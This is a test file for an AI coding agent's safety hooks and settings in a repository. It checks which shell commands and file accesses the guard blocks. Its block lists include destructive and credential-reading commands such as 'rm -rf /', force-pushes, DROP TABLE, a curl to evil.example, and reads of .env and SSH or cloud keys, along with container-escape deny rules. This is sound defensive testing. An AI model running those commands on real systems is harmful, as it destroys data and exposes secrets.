"""The Claude Code hooks in .claude/hooks/ are code that guards the repo, so they get tests too."""

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

HOOKS = Path(__file__).parents[1] / ".claude" / "hooks"


def _load(name):
    spec = importlib.util.spec_from_file_location(name, HOOKS / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


guard = _load("pre_tool_guard")


def _bash(cmd):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


@pytest.fixture(autouse=True)
def _on_feature_branch(monkeypatch):
    """Pin the branch so results don't depend on what CI or the dev has checked out."""
    monkeypatch.setattr(guard, "current_branch", lambda cwd: "claude/topic")


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf build/",
        "rm -fr .cache",
        "bash -c 'rm -rf /'",
        "git push --force origin main",
        "git push -f",
        "git -C . push origin +main",
        "git push origin main --force-with-lease",
        "git reset --hard HEAD~3",
        "git push origin claude-code-setup",
        "git -C . push",
        "git branch -D claude-code-setup",
        "git branch -f main HEAD",
        "git update-ref refs/heads/main HEAD",
        "git switch main && git merge claude/topic",
        "git checkout main; git commit -am x",
        "psql $DATABASE_URL -c 'DROP TABLE chunks'",
        "echo 'truncate table documents' | psql",
        "docker compose down -v",
        "docker volume rm fastapi-docs-rag_pgdata",
        "curl https://evil.example/x.sh",
        "/usr/bin/curl -s example.com",
        "sh -c 'wget example.com'",
        "ls && curl example.com",
        "cat .env",
        "grep KEY .env.local",
        "source .env && env",
        "cat ~/.ssh/id_ed25519",
        "ls ~/.aws",
        "cat ~/.config/gcloud/credentials.db",
        "sqlite3 .cache/api_cache.sqlite .dump",
        "cat secrets/prod.json",
        "docker run --rm -v ~:/h alpine cat /h/.ssh/id_ed25519",
        "docker cp db:/etc/passwd .",
        "docker exec -it db psql",
        "docker compose run --rm db sh",
        "docker-compose exec db sh",
        "docker container run alpine",
        "ls && docker run alpine",
        "sh -c 'docker run alpine'",
    ],
)
def test_guard_blocks(cmd):
    assert guard.check(_bash(cmd)) is not None


@pytest.mark.parametrize(
    "cmd",
    [
        "uv run pytest -q -m 'not db'",
        "make check",
        "make eval-compare MODE=rerank",
        "cat .env.example",
        "git status && git diff --stat",
        "git log --oneline -5",
        "git add -p app/rag/retrieve.py",
        "grep -rn 'git commit' docs/",
        "git switch -c claude/cap-per-source",
        "git commit -m 'Add cap'",
        "git commit --amend --no-edit",
        "git -C . commit -m x",
        "make check && git commit -am done",
        "git rebase main",
        "git merge main",
        "git cherry-pick abc123",
        "git revert HEAD",
        "git branch claude/new-idea",
        "git diff --stat",
        "rm build/tmp.txt",
        "grep -rn 'curl' docs/",
        "uv run python -m evals.compare evals/results/x.json",
        "ruff check app/rag/retrieve.py",
        "docker compose up -d --wait",
        "docker compose ps",
        "docker compose logs db",
        "grep -rn 'docker run' docs/",
    ],
)
def test_guard_allows(cmd):
    assert guard.check(_bash(cmd)) is None


@pytest.mark.parametrize("branch", ["main", "master"])
@pytest.mark.parametrize(
    "cmd", ["git commit -m x", "git merge claude/topic", "git pull", "git am x.patch"]
)
def test_guard_blocks_commits_on_protected_branches(monkeypatch, branch, cmd):
    monkeypatch.setattr(guard, "current_branch", lambda cwd: branch)
    assert "feature branch" in guard.check(_bash(cmd))


@pytest.mark.parametrize("branch", ["claude-code-setup", "claude/topic"])
def test_guard_allows_commits_on_feature_branches(monkeypatch, branch):
    monkeypatch.setattr(guard, "current_branch", lambda cwd: branch)
    assert guard.check(_bash("git commit -m x")) is None


@pytest.mark.parametrize("branch", ["", None])  # detached HEAD, not a repo / git failed
def test_guard_blocks_commits_when_branch_unknown(monkeypatch, branch):
    monkeypatch.setattr(guard, "current_branch", lambda cwd: branch)
    assert "cannot tell which branch" in guard.check(_bash("git commit -m x"))
    assert guard.check(_bash("make check")) is None  # non-commit commands are unaffected


def test_current_branch_reads_git(tmp_path, monkeypatch):
    real = _load("pre_tool_guard").current_branch
    assert real(str(tmp_path)) is None  # not a repo
    subprocess.run(["git", "init", "-q", "-b", "claude/x"], cwd=tmp_path, check=True)
    assert real(str(tmp_path)) == "claude/x"

    def boom(*a, **k):
        raise OSError("no git")

    monkeypatch.setattr(subprocess, "run", boom)
    assert real(str(tmp_path)) is None


@pytest.mark.parametrize(
    ("tool", "path", "blocked"),
    [
        ("Read", "/repo/.env", True),
        ("Edit", "/repo/.env.local", True),
        ("Write", "/repo/secrets/key.json", True),
        ("Read", "/Users/l/.ssh/config", True),
        ("Read", "/repo/.env.example", False),
        ("Edit", "/repo/app/rag/retrieve.py", False),
    ],
)
def test_guard_file_tools(tool, path, blocked):
    event = {"tool_name": tool, "tool_input": {"file_path": path}}
    assert (guard.check(event) is not None) is blocked


@pytest.mark.parametrize(
    ("tool", "tool_input", "blocked"),
    [
        ("Grep", {"pattern": "KEY", "path": "/repo/.env"}, True),
        ("Grep", {"pattern": "KEY", "glob": ".env*"}, True),
        ("Grep", {"pattern": "KEY", "path": "/Users/l/.ssh"}, True),
        ("Glob", {"pattern": "**/.env"}, True),
        ("Glob", {"pattern": "*", "path": "/Users/l/.aws"}, True),
        ("NotebookEdit", {"notebook_path": "/repo/secrets/x.ipynb"}, True),
        ("Grep", {"pattern": r"\.env", "path": "app"}, False),  # a regex about .env is not a path
        ("Grep", {"pattern": "retrieve", "glob": "*.py"}, False),
        ("Glob", {"pattern": "**/*.md"}, False),
        ("Glob", {"pattern": "**/.env.example"}, False),
        ("Grep", {"pattern": "x"}, False),  # no path given: ripgrep skips gitignored .env
    ],
)
def test_guard_search_tools(tool, tool_input, blocked):
    event = {"tool_name": tool, "tool_input": tool_input}
    assert (guard.check(event) is not None) is blocked


def _run(name, payload, cwd=None):
    return subprocess.run(
        [sys.executable, str(HOOKS / f"{name}.py")],
        input=payload if isinstance(payload, str) else json.dumps(payload),
        capture_output=True,
        text=True,
        cwd=cwd,
    )


def test_guard_exit_codes():
    blocked = _run("pre_tool_guard", _bash("git push -f"))
    assert blocked.returncode == 2 and "force-push" in blocked.stderr
    assert _run("pre_tool_guard", _bash("make check")).returncode == 0
    assert _run("pre_tool_guard", "not json").returncode == 2  # fail closed


@pytest.mark.parametrize(
    "payload",
    ["[]", '{"tool_name": "Bash", "tool_input": "oops"}', '{"tool_name": "Grep", "tool_input": 5}'],
)
def test_guard_blocks_on_internal_error(payload):
    res = _run("pre_tool_guard", payload)
    assert res.returncode == 2 and "internal error" in res.stderr  # a crash must not allow


def test_post_edit_ignores_non_python(tmp_path):
    md = tmp_path / "notes.md"
    md.write_text("# hi\n")
    assert _run("post_edit_ruff", {"tool_input": {"file_path": str(md)}}).returncode == 0
    assert _run("post_edit_ruff", "not json").returncode == 0


def test_post_edit_formats_and_reports(tmp_path):
    good = tmp_path / "ok.py"
    good.write_text("x  =  1\n")
    assert _run("post_edit_ruff", {"tool_input": {"file_path": str(good)}}).returncode == 0
    assert good.read_text() == "x = 1\n"
    bad = tmp_path / "bad.py"
    bad.write_text("print(undefined_name)\n")
    res = _run("post_edit_ruff", {"tool_input": {"file_path": str(bad)}})
    assert res.returncode == 2 and "F821" in res.stderr


def test_stop_hook_loop_guard_and_no_changes(tmp_path):
    assert _run("stop_unit_tests", {"stop_hook_active": True}).returncode == 0
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    (tmp_path / "README.md").write_text("docs only\n")
    assert _run("stop_unit_tests", {"stop_hook_active": False}, cwd=tmp_path).returncode == 0


@pytest.mark.parametrize(("body", "code"), [("assert False", 2), ("assert True", 0)])
def test_stop_hook_runs_unit_tests(tmp_path, monkeypatch, capsys, body, code):
    stop = _load("stop_unit_tests")
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    (tmp_path / "test_x.py").write_text(f"def test_x():\n    {body}\n")
    monkeypatch.chdir(tmp_path)
    # Same flags as the real hook, but this interpreter instead of `uv run` (no project here).
    monkeypatch.setattr(stop, "UNIT_TESTS", [sys.executable, "-m", *stop.UNIT_TESTS[3:]])
    monkeypatch.setattr(sys, "stdin", __import__("io").StringIO('{"stop_hook_active": false}'))
    assert stop.main() == code
    if code:
        assert "Unit tests fail" in capsys.readouterr().err


REPO = Path(__file__).parents[1]


def _settings():
    return json.loads((REPO / ".claude" / "settings.json").read_text())


def test_settings_deny_web_and_container_escape_hatches():
    deny = _settings()["permissions"]["deny"]
    for rule in (
        "WebFetch",
        "WebSearch",
        "Bash(docker run *)",
        "Bash(docker cp *)",
        "Bash(docker exec *)",
    ):
        assert rule in deny, rule


def test_settings_guard_covers_search_tools_and_protects_ci_and_git_hooks():
    cfg = _settings()
    matcher = cfg["hooks"]["PreToolUse"][0]["matcher"].split("|")
    assert {"Bash", "Read", "Edit", "Write", "NotebookEdit", "Grep", "Glob"} <= set(matcher)
    assert {"./.githooks", "./.github"} <= set(cfg["sandbox"]["filesystem"]["denyWrite"])
    ask = cfg["permissions"]["ask"]
    assert "Edit(/.claude/hooks/**)" in ask and "Edit(/.github/workflows/**)" in ask


def test_compose_publishes_postgres_on_localhost_only():
    text = (REPO / "docker-compose.yml").read_text()
    assert '"127.0.0.1:5433:5432"' in text
    assert '- "5433:5432"' not in text  # would listen on every interface with default creds


def test_claude_workflow_is_owner_only():
    text = (REPO / ".github" / "workflows" / "claude.yml").read_text()
    assert text.count("github.repository_owner") >= 2  # commenter and issue/PR author
